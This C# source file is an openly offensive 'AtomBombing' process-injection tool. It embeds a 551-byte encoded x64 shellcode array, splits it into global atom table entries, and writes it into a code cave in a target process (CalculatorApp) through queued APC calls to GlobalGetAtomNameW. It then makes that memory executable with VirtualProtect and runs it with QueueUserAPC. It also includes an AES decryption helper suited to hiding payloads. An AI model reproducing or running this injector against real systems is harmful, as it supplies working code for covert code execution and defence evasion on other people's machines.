using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

// original code here - https://github.com/plackyhacker/Shellcode-Injection-Techniques

namespace Atom_Bombing_Injector
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        internal static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, UInt32 dwThreadId);

        [DllImport("kernel32.dll")]
        internal static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        internal struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public MemoryProtection AllocationProtect;
            public IntPtr RegionSize;
            public StateEnum State;
            public MemoryProtection Protect;
            public TypeEnum Type;
        }
        internal enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        internal enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }
        internal enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }
        [Flags]
        internal enum ThreadAccess : UInt32
        {
            TERMINATE = 0x0001,
            SUSPEND_RESUME = 0x0002,
            GET_CONTEXT = 0x0008,
            SET_CONTEXT = 0x0010,
            SET_INFORMATION = 0x0020,
            QUERY_INFORMATION = 0x0040,
            SET_THREAD_TOKEN = 0x0080,
            IMPERSONATE = 0x0100,
            DIRECT_IMPERSONATION = 0x0200,
            THREAD_ALL_ACCESS = 0x1fffff
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        internal static extern ushort GlobalAddAtomW(IntPtr lpString);

        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Auto)]
        internal static extern NTSTATUS NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, UInt32 ApcRoutineContext, IntPtr ApcStatusBlock, Int32 ApcReserved);
        internal enum NTSTATUS : uint
        {
            // Success
            Wait0 = 0x00000000,
            Success = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        internal class AesHelper
        {

            public static byte[] Decrypt(string key, string aes_base64)
            {
                byte[] tempKey = Encoding.ASCII.GetBytes(key);
                tempKey = SHA256.Create().ComputeHash(tempKey);

                byte[] data = Convert.FromBase64String(aes_base64);

                // decrypt data
                Aes aes = new AesManaged();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

                using (MemoryStream msDecrypt = new MemoryStream())
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                    {

                        csDecrypt.Write(data, 0, data.Length);
                        return msDecrypt.ToArray();
                    }
                }
            }

            public static byte[] SubArray(byte[] a, int length)
            {
                byte[] b = new byte[length];
                for (int i = 0; i < length; i++)
                {
                    b[i] = a[i];
                }
                return b;
            }

            public static byte[] SubArray(byte[] a, int startIndex, int length)
            {
                int lengthOfArrayToCopy = length;
                if (length + startIndex > a.Length)
                    lengthOfArrayToCopy = a.Length - startIndex;

                byte[] b = new byte[lengthOfArrayToCopy];
                for (int i = 0; i < lengthOfArrayToCopy; i++)
                {
                    b[i] = a[startIndex + i];
                }
                return b;
            }
        }
        internal static IntPtr GetModuleBaseAddress(string name)
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                    return m.BaseAddress;
            }

            // we can't find the base address
            return IntPtr.Zero;
        }
        internal static IntPtr FindCodeCave(IntPtr hProcess, IntPtr startAddress, int size, int regionSize)
        {
            // byte array to hold the read memory
            byte[] areaToSearch = new byte[regionSize];

            // the region in memory so we can search it for a code cave
            if (!ReadProcessMemory(hProcess, startAddress, areaToSearch, regionSize, out IntPtr lpNumberOfBytesRead))
            {
                // this shouldnt happen but if it does just return zero
                return IntPtr.Zero;
            }

            // look for a code cave
            for (int i = 0; i < (Int32)lpNumberOfBytesRead; i++)
            {
                // find the start of a possible code cave
                if (areaToSearch[i] != 0x00)
                    continue;

                // if we are nearing the end of the region just return zero
                if (i + size >= (Int32)lpNumberOfBytesRead)
                    return IntPtr.Zero;

                // now we need to check to see if there are enough consecutive zeros to put our shellcode
                bool found = false;
                for (int j = i; j < i + size; j++)
                {
                    if (areaToSearch[j] != 0x00)
                    {
                        i = j;
                        break;
                    }
                    else
                    {
                        // we have a code cave
                        if (j == i + (size - 1))
                        {
                            found = true;
                            break;
                        }
                    }
                }

                // return the code cave address
                if (found)
                    return IntPtr.Add(startAddress, i);
            }

            return IntPtr.Zero;
        }
        internal class PageHelper
        {
            public IntPtr BaseAddress { get; set; }
            public Int32 RegionSize { get; set; }

            public PageHelper(IntPtr baseAddress, Int32 regionSize)
            {
                BaseAddress = baseAddress;
                RegionSize = regionSize;
            }
        }
        internal static PageHelper[] FindWritablePages(IntPtr hProcess, IntPtr threadStartAddress)
        {
            Int32 size;
            List<PageHelper> pages = new List<PageHelper>();

            while (true)
            {
                try
                {
                    // query the memory region to see if it is readable and writable, and grab the region size
                    size = VirtualQueryEx(hProcess, threadStartAddress, out MEMORY_BASIC_INFORMATION lpBuffer, (UInt32)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));

                    if (size != 0)
                    {
                        // we need readable and writable pages to find a code cave and write our shellcode to
                        string pageProtection = Enum.GetName(typeof(MemoryProtection), lpBuffer.Protect);
                        if (pageProtection.Contains("WRITE") && pageProtection.Contains("READ"))
                            pages.Add(new PageHelper(lpBuffer.BaseAddress, (Int32)lpBuffer.RegionSize));

                        // move to the next page
                        threadStartAddress = IntPtr.Add(threadStartAddress, (Int32)lpBuffer.RegionSize);
                    }
                    else
                        continue;
                }
                catch
                {
                    break;
                }
            }

            return pages.ToArray();
        }
        internal static ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {
            }
            */
        }
        static void Main(string[] args)
        {
            // put shellcode here
            byte[] shellcode = new byte[551] {0x48,0x31,0xc9,0x48,0x81,0xe9,
0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
0xbb,0x23,0x2c,0x64,0xab,0x8f,0x0d,0x99,0x8e,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xdf,0x64,0xe7,
0x4f,0x7f,0xe5,0x55,0x8e,0x23,0x2c,0x25,0xfa,0xce,0x5d,0xcb,
0xc6,0x12,0xfe,0x01,0xe3,0x04,0x5f,0xf9,0xdf,0x6b,0xa7,0x36,
0xb3,0xc7,0x86,0xcb,0xae,0x75,0x61,0x55,0x62,0xc7,0x02,0x2e,
0xc4,0x69,0x64,0xef,0xd9,0xdf,0x45,0xa8,0x4e,0x8f,0x10,0x05,
0xd7,0x8d,0x21,0xb9,0xcf,0xe2,0xe5,0x69,0xea,0x8e,0xcc,0x7b,
0x63,0x71,0x6d,0x35,0xe3,0x04,0x5f,0xb9,0x05,0x61,0x10,0x2c,
0xaa,0x5f,0x6b,0x18,0xf6,0x3b,0x27,0x66,0xa4,0x0a,0x7f,0x99,
0x8e,0x23,0xa7,0xe4,0x23,0x8f,0x0d,0x99,0xc6,0xa6,0xec,0x10,
0xcc,0xc7,0x0c,0x49,0x05,0x6b,0x34,0x34,0xef,0x04,0x4d,0xb9,
0xc7,0x22,0xfc,0x87,0xfd,0xc7,0xf2,0x50,0xc3,0x12,0xe5,0x25,
0x20,0xbb,0x85,0xd1,0x8f,0xf5,0x64,0x55,0x6b,0x23,0x4c,0x58,
0x47,0x2e,0x6d,0x65,0x6a,0xb7,0xed,0xec,0x7f,0x6f,0x2f,0x28,
0x8f,0x87,0x48,0xa0,0x5f,0x56,0xf4,0x3c,0xef,0x04,0x4d,0xbd,
0xc7,0x22,0xfc,0x02,0xea,0x04,0x01,0xd1,0xca,0xa8,0x6c,0x78,
0xe2,0x8e,0xdd,0xd8,0x05,0x27,0xa4,0x25,0xf3,0xce,0x55,0xd1,
0x8f,0xf3,0x72,0x3d,0xf1,0xce,0x55,0xd8,0xd7,0x62,0x76,0x2c,
0x28,0x63,0x2d,0xd8,0xdc,0xdc,0xcc,0x3c,0xea,0xd6,0x57,0xd1,
0x05,0x31,0xc5,0x2f,0x54,0x70,0xf2,0xc4,0xc7,0x9d,0x5b,0x17,
0x99,0xd0,0x3e,0xab,0x8e,0x23,0x6d,0x32,0xe2,0x06,0xeb,0xd1,
0x0f,0xcf,0x8c,0x65,0xab,0x8f,0x44,0x10,0x6b,0x6a,0x90,0x66,
0xab,0x8e,0xb6,0x59,0x26,0xa6,0xa9,0x25,0xff,0xc6,0x84,0x7d,
0xc2,0xaa,0xdd,0x25,0x11,0xc3,0x7a,0xbf,0x89,0xdc,0xf9,0x28,
0x22,0x65,0x65,0x98,0x8f,0x23,0x2c,0x3d,0xea,0x35,0x24,0x19,
0xe5,0x23,0xd3,0xb1,0xc1,0x85,0x4c,0xc7,0xde,0x73,0x61,0x55,
0x62,0xc2,0x3c,0x59,0xc6,0xdc,0xec,0x2c,0x22,0x4d,0x45,0x66,
0x4e,0x6b,0xa5,0xa5,0xea,0x35,0xe7,0x96,0x51,0xc3,0xd3,0xb1,
0xe3,0x06,0xca,0xf3,0x9e,0x62,0x74,0x28,0x22,0x6d,0x45,0x10,
0x77,0x62,0x96,0xfd,0x0e,0xfb,0x6c,0x66,0x5b,0xa6,0xec,0x10,
0xa1,0xc6,0xf2,0x57,0xfb,0xc6,0xc4,0xf7,0xab,0x8f,0x0d,0xd1,
0x0d,0xcf,0x3c,0x2c,0x22,0x6d,0x40,0xa8,0x47,0x49,0x28,0x25,
0xf3,0xc7,0x84,0x60,0xcf,0x99,0x2e,0xbd,0x63,0xd0,0xf2,0x4c,
0x0d,0xdb,0x2c,0x1a,0xfe,0xc7,0x8e,0x5d,0xae,0x7d,0xa5,0x92,
0xc1,0xcf,0x4c,0xc0,0xe6,0x23,0x3c,0x64,0xab,0xce,0x55,0xd1,
0x07,0xd1,0x64,0x55,0x62,0xce,0xb7,0xc1,0x2a,0x70,0xc9,0x9b,
0x7e,0xc7,0x84,0x5a,0xc7,0xaa,0xeb,0x29,0x9a,0x46,0x44,0x10,
0x7e,0x6b,0xa5,0xbe,0xe3,0x06,0xf4,0xd8,0x34,0x21,0xf5,0xac,
0xf4,0x70,0xd8,0x1a,0x76,0x23,0x51,0x4c,0xf3,0xce,0x5a,0xc0,
0xe6,0x23,0x6c,0x64,0xab,0xce,0x55,0xf3,0x8e,0x79,0x6d,0xde,
0xa0,0xa0,0x02,0xa9,0x71,0xf6,0x7b,0x3d,0xea,0x35,0x78,0xf7,
0xc3,0x42,0xd3,0xb1,0xe2,0x70,0xc3,0x70,0xb2,0xdc,0xd3,0x9b,
0xe3,0x8e,0xce,0xd1,0xa7,0xe5,0x64,0xe1,0x5d,0xfa,0xb9,0xd8,
0x71,0xc4,0x74,0x0e,0xab,0xd6,0x44,0x5e,0x4c,0xd3,0x99,0xc6,
0xfd,0x70,0xd8,0x99,0x8e};


            Process[] processes = Process.GetProcessesByName("CalculatorApp");

            if (processes.Length == 0)
            {
                Console.WriteLine("[!] Unable to find process to inject into!");
                return;
            }

            Console.WriteLine("[+] Found process: {0}", new string[] { processes[0].Id.ToString() });
            Process target = processes[0];

            ProcessThread thread = GetThread(target.Threads);
            Console.WriteLine("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            Console.WriteLine("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // need to find a remote page we can write to
            PageHelper[] pWritablePages = FindWritablePages(target.Handle, thread.StartAddress);
            //FindWritablePage(target.Handle, thread.StartAddress);
            if (pWritablePages.Length == 0)
            {
                Console.WriteLine("[!] Unable to find writable page!");
                return;
            }
            else
                Console.WriteLine("[+] FindWritablePages() - number found: {0}", new string[] { pWritablePages.Length.ToString() });

            // try to find a code cave in the writable pages to atom bomb our shellcode
            IntPtr pWritable = IntPtr.Zero;
            for (int i = 0; i < pWritablePages.Length; i++)
            {
                pWritable = FindCodeCave(target.Handle, pWritablePages[i].BaseAddress, shellcode.Length, pWritablePages[i].RegionSize);
                if (pWritable != IntPtr.Zero)
                    break;
            }

            // we did not find a suitable code cave
            if (pWritable == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to find a suitable code cave!");
                return;
            }
            else
                Console.WriteLine("[+] Found a suitable code cave - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

            IntPtr codeCave = pWritable;

            // get the proc address - GlobalGetAtomNameA
            IntPtr pGlobalGetAtomNameW = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "GlobalGetAtomNameW");
            Console.WriteLine("[+] GetProcAddress() - pGlobalGetAtomNameW: 0x{0}", new string[] { pGlobalGetAtomNameW.ToString("X") });


            // define a chunk size to write our atom names (note: an atom name can be 255 max size)
            Int32 chunkSize = 200;

            // add the atom names as shellcode chunks of length chunkSize - including the terminating null byte
            Int32 sections = (shellcode.Length / chunkSize) + 1;

            // loop through the sections and add the shell code as atom names
            for (int i = 0; i < sections; i++)
            {
                // get the next shellcode chunk
                byte[] tmpBytes = AesHelper.SubArray(shellcode, i * chunkSize, chunkSize);
                byte[] shellcodeChunk = new byte[tmpBytes.Length + 1];

                // add a null byte to the end
                Buffer.BlockCopy(tmpBytes, 0, shellcodeChunk, 0, tmpBytes.Length);
                Buffer.BlockCopy(new byte[1] { 0x00 }, 0, shellcodeChunk, tmpBytes.Length, 1);

                // add the shellcode to the global atom table
                unsafe
                {
                    fixed (byte* ptr = shellcodeChunk)
                    {
                        UInt16 ATOM = GlobalAddAtomW((IntPtr)ptr);
                        Console.WriteLine("[+] GlobalAddAtom() - ATOM: 0x{0}", new string[] { ATOM.ToString("X") });

                        // queue the APC thread
                        NtQueueApcThread(hThread, pGlobalGetAtomNameW, ATOM, pWritable, chunkSize * 2);
                        Console.WriteLine("[+] NtQueueApcThread() - pWritable: 0x{0}", new string[] { pWritable.ToString("X") });

                        // increment to the next writable memory location
                        pWritable += chunkSize;
                    }
                }
            }

            IntPtr pVirtualProtect = GetProcAddress(GetModuleBaseAddress("kernel32.dll"), "VirtualProtect");
            Console.WriteLine("[+] GetProcAddress() - pVirtualProtect: 0x{0}", new string[] { pVirtualProtect.ToString("X") });

            NtQueueApcThread(hThread, pVirtualProtect, (UInt32)codeCave, (IntPtr)shellcode.Length, (Int32)(MemoryProtection.PAGE_EXECUTE_READWRITE));
            Console.WriteLine("[+] NtQueueApcThread() PAGE_EXECUTE_READWRITE - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });

            QueueUserAPC(codeCave, hThread, IntPtr.Zero);
            Console.WriteLine("[+] QueueUserAPC() - codeCave: 0x{0}", new string[] { codeCave.ToString("X") });
        }
    }
}
